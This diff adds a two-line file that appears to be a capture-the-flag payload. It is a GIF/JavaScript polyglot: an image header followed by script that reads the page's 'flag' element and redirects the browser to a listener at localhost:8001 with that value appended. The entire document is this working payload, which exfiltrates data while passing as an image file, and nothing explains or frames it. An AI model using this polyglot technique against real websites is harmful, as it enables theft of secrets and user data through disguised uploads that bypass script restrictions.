@@ -1,0 +1,2 @@
+GIF89a/*.......*/=0;var flag = document.getElementById('flag').textContent;
+        document.location = 'http://localhost:8001/' + flag;
